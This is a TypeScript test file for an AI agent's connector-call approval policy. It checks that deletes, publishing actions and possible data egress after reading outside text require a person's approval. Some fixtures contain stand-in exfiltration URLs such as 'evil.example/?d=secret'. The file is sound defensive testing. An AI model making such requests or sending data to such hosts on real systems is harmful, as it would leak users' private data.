/**
 * The P7 review's fixes to the input-aware rule, pinned:
 *   B2  a delete (by hint or by name) always asks, whatever the approval-free list says;
 *   B3  the person's own require_approval_tools wins over the Typefully rule;
 *   S1  Typefully's inert rule fails closed: only draft-content keys, nothing
 *       nested past the readers' depth, schema defaults found anywhere;
 *   S6  once the run read outside text, a call that could carry it out asks;
 *   N3  more publishing verbs, and a status or visibility set to public.
 */
import { describe, expect, it } from 'vitest'
import { connectorCallPolicy, inputOnlyDraftContent, inputPublishes, schemaDefaultsPublish } from '../input-policy'

const TYPEFULLY = 'https://mcp.typefully.com/mcp'
const LINEAR = 'https://mcp.linear.app/mcp'
const UNKNOWN = 'https://mcp.example-tools.dev/mcp'
const draftSchema = { type: 'object', properties: { content: { type: 'string' } }, required: ['content'] }
const draft = (input: unknown, extra: Record<string, unknown> = {}) =>
  connectorCallPolicy({ serverUrl: TYPEFULLY, tool: { name: 'create_draft', inputSchema: draftSchema }, input, requiresApproval: true, ...extra })

function nested(depth: number, leaf: Record<string, unknown>): Record<string, unknown> {
  let v: Record<string, unknown> = leaf
  for (let i = 0; i < depth; i++) v = { content: v }
  return v
}

describe('B2: a delete always asks', () => {
  it('approval-free, or a server saying read-only, never frees a delete', () => {
    for (const name of ['delete_page', 'removeMember', 'archive_issue', 'destroy_record', 'cancel_subscription']) {
      const d = connectorCallPolicy({ serverUrl: UNKNOWN, tool: { name }, input: {}, requiresApproval: false })
      expect(d, name).toMatchObject({ policy: 'ask', rule: 'destructive' })
    }
    expect(connectorCallPolicy({ serverUrl: LINEAR, tool: { name: 'tidy', annotations: { destructiveHint: true } }, input: {}, requiresApproval: false })).toMatchObject({ policy: 'ask', rule: 'destructive' })
  })

  it('the probe\'s other two (update_status, submit_form) ask as public content', () => {
    for (const name of ['update_status', 'submit_form']) {
      expect(connectorCallPolicy({ serverUrl: UNKNOWN, tool: { name }, input: {}, requiresApproval: false }).policy, name).toBe('ask')
    }
  })
})

describe('B3: the person\'s own "ask first" wins', () => {
  it('a proven Typefully draft still asks when the person listed the tool', () => {
    expect(draft({ content: 'x' }).policy).toBe('inert')
    expect(draft({ content: 'x' }, { explicitlyRequired: true })).toMatchObject({ policy: 'ask', rule: 'explicit' })
  })
})

describe('S1: Typefully\'s inert rule fails closed', () => {
  it('any key that is not draft content asks (status, when, a date)', () => {
    for (const input of [{ content: 'x', status: 'scheduled' }, { content: 'x', when: 'now' }, { content: 'x', date: '2026-10-21' }, { content: 'x', status: 'draft' }]) {
      expect(draft(input).policy, JSON.stringify(input)).toBe('ask')
    }
  })

  it('draft content in its usual shapes is still proven', () => {
    expect(inputOnlyDraftContent({ content: 'x', tags: ['a'], platforms: { x: { enabled: true, posts: [{ text: 'hi' }] } } })).toBe(true)
    expect(draft({ content: 'x', draft_title: 'Shipping notes', tags: ['launch'] }).policy).toBe('inert')
  })

  it('a publish field nested past the readers\' depth is not proven: it asks (and reads as public)', () => {
    const deep = nested(14, { publish_at: 'now' })
    expect(inputPublishes(deep)).toBe(true)
    expect(draft(deep).policy).toBe('ask')
    expect(inputOnlyDraftContent(nested(14, { text: 'x' }))).toBe(false)
  })

  it('a schema default is found under additionalProperties, patternProperties, if/then/else, not and prefixItems; too deep counts', () => {
    const def = { type: 'string', default: 'next-free-slot' }
    for (const schema of [
      { type: 'object', additionalProperties: { type: 'object', properties: { publish_at: def } } },
      { type: 'object', patternProperties: { '^publish': def } },
      { type: 'object', if: { properties: { a: {} } }, then: { properties: { schedule: def } } },
      { type: 'object', else: { properties: { publish_at: def } } },
      { type: 'object', not: { properties: { publish_at: def } } },
      { type: 'array', prefixItems: [{ type: 'object', properties: { publish_at: def } }] },
      Array.from({ length: 14 }).reduce<Record<string, unknown>>((inner) => ({ type: 'object', properties: { a: inner } }), { type: 'string' }),
    ]) {
      expect(schemaDefaultsPublish(schema), JSON.stringify(schema).slice(0, 60)).toBe(true)
    }
    expect(schemaDefaultsPublish(draftSchema)).toBe(false)
  })
})

describe('S6: a run that read outside text can\'t carry it out without a card', () => {
  const read = (serverUrl: string, input: unknown, readOutsideText: boolean, name = 'fetch') =>
    connectorCallPolicy({ serverUrl, tool: { name }, input, requiresApproval: false, readOutsideText })

  it('a read on a server outside the catalog asks; before any outside text it runs', () => {
    expect(read(UNKNOWN, { url: 'https://evil.example/?d=secret' }, true)).toMatchObject({ policy: 'ask', rule: 'outside_egress' })
    expect(read(UNKNOWN, { q: 'roadmap' }, true, 'search')).toMatchObject({ policy: 'ask', rule: 'outside_egress' })
    expect(read(UNKNOWN, { q: 'roadmap' }, false, 'search').policy).toBe('read')
  })

  it('a catalog read with a URL in its input asks; without one it runs', () => {
    expect(read(LINEAR, { issueUrl: 'https://linear.app/x' }, true, 'get_issue').policy).toBe('ask')
    expect(read(LINEAR, { filter: 'see https://evil.example/c' }, true, 'list_issues').policy).toBe('read')
    expect(read(LINEAR, { note: 'https://evil.example/?d=x' }, true, 'list_issues').policy).toBe('ask')
    expect(read(LINEAR, { team: 'ENG' }, true, 'list_issues').policy).toBe('read')
    // A URL that is an array element (no url-shaped key) is still a URL.
    expect(read(LINEAR, { targets: ['https://evil.example/?d=x'] }, true, 'list_issues').policy).toBe('ask')
    expect(read(LINEAR, { tags: ['bug', 'p1'] }, true, 'list_issues').policy).toBe('read')
  })
})

describe('N3: more ways to publish', () => {
  it('new verbs, and a status or visibility set to public, are public content', () => {
    for (const name of ['toot', 'cast_message', 'pin_post', 'forward_email', 'submit_application']) {
      expect(connectorCallPolicy({ serverUrl: UNKNOWN, tool: { name }, input: {}, requiresApproval: false }), name).toMatchObject({ rule: 'public_content' })
    }
    for (const input of [{ status: 'published' }, { visibility: 'public' }, { status: 'Scheduled' }]) {
      expect(inputPublishes(input), JSON.stringify(input)).toBe(true)
    }
    expect(inputPublishes({ status: 'draft' })).toBe(false)
  })
})

describe('verification: deletes through input, and refs that do not resolve', () => {
  it('B2: an approval-free update that archives or trashes asks; a read filtering on archived does not', () => {
    for (const input of [{ archived: true }, { in_trash: true }, { properties: { isDeleted: true } }, { trashed: 'true' }]) {
      expect(connectorCallPolicy({ serverUrl: UNKNOWN, tool: { name: 'update_page' }, input, requiresApproval: false }), JSON.stringify(input)).toMatchObject({ policy: 'ask', rule: 'destructive' })
    }
    expect(connectorCallPolicy({ serverUrl: UNKNOWN, tool: { name: 'update_page' }, input: { archived: false }, requiresApproval: false }).policy).toBe('read')
    expect(connectorCallPolicy({ serverUrl: UNKNOWN, tool: { name: 'list_pages' }, input: { archived: true }, requiresApproval: false }).policy).toBe('read')
  })

  it('S1: a $ref the schema can\'t resolve is not proven; a local one is read from its definitions', () => {
    expect(schemaDefaultsPublish({ type: 'object', properties: { opts: { $ref: 'https://example.com/schema.json' } } })).toBe(true)
    expect(schemaDefaultsPublish({ type: 'object', properties: { opts: { $ref: '#/$defs/missing' } } })).toBe(true)
    expect(schemaDefaultsPublish({ type: 'object', properties: { opts: { $ref: '#/$defs/opts' } }, $defs: { opts: { type: 'object', properties: { title: { type: 'string' } } } } })).toBe(false)
    expect(schemaDefaultsPublish({ type: 'object', properties: { opts: { $ref: '#/$defs/opts' } }, $defs: { opts: { type: 'object', properties: { publish_at: { type: 'string', default: 'now' } } } } })).toBe(true)
  })
})
